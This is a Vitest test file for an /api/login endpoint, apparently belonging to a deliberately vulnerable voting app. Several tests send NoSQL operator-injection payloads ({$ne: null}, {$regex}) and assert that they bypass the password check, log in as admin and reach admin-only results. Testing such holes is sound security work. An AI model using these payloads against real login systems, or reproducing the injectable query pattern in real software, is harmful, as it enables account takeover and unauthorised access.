import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { createTestContext, type TestContext } from './helpers/testContext'

describe('NoSQL operator injection in /api/login', () => {
  let ctx: TestContext

  beforeEach(async () => {
    ctx = await createTestContext()
  })

  afterEach(async () => {
    await ctx.close()
  })

  it('logs in normally with correct string credentials', async () => {
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: 'voter', password: ctx.seedResult.voterPassword },
    })
    expect(res.statusCode).toBe(200)
    expect(res.json().token).toBeTypeOf('string')
  })

  it('rejects an incorrect string password', async () => {
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: 'voter', password: 'definitely-wrong' },
    })
    expect(res.statusCode).toBe(401)
  })

  it('rejects an unknown username with a made-up string password', async () => {
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: 'nobody', password: 'whatever' },
    })
    expect(res.statusCode).toBe(401)
  })

  it('bypasses the password check for a known username using a $ne operator', async () => {
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: 'admin', password: { $ne: null } },
    })
    expect(res.statusCode).toBe(200)
    expect(res.json().token).toBeTypeOf('string')
  })

  it('does not authenticate when both username and password are wrong-type but match nothing', async () => {
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: { $regex: '^nonexistent' }, password: { $ne: null } },
    })
    expect(res.statusCode).toBe(401)
  })

  it('authenticates as admin via full operator injection on both fields', async () => {
    // $ne: null on both fields matches whichever user document Mongo returns first,
    // so pin it down with a $regex that can only match the admin username.
    const res = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: { $regex: '^admin$' }, password: { $ne: null } },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.token).toBeTypeOf('string')
  })

  it('issues a session that reaches admin-only results after an injected admin login', async () => {
    const login = await ctx.fastify.inject({
      method: 'POST',
      url: '/api/login',
      payload: { username: 'admin', password: { $ne: null } },
    })
    const cookie = login.cookies.find((c) => c.name === 'token')

    const res = await ctx.fastify.inject({
      method: 'GET',
      url: '/api/admin/results',
      cookies: { token: cookie!.value },
    })
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.users.some((u: any) => u.username === 'admin')).toBe(true)
  })
})
